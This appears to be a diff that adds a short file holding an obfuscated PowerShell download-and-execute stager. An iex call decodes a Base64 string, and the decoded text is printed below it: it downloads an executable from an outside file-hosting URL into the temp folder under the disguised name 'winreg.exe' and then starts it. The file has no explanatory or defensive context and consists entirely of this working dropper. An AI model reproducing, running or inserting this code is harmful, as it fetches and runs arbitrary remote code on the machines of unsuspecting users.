@@ -1,0 +1,7 @@
+iex([SYSTEm.tExt.EnCodINg]::Utf8.GetsTring([sysTEM.cOnVeRT]::fROmBASE64STrInG('CihOZXctT2JqZWN0IFN5U3RFTS5uZXQuV2ViQ0xpRU50KS5Eb3dOTE9BRGZpTEUoJ2h0dHBzOi8vYS5wb21mLmNhdC9oc21xcmguZXhlJywiJGVOVjpURU1QXHdpbnJlZy5leGUiKTtTdGFydC1Qcm9jZXNzICgiJGVOVjpURU1QXHdpbnJlZy5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SyStEM.net.WebCLiENt).DowNLOADfiLE('https://a.pomf.cat/hsmqrh.exe',"$eNV:TEMP\winreg.exe");Start-Process ("$eNV:TEMP\winreg.exe")
+
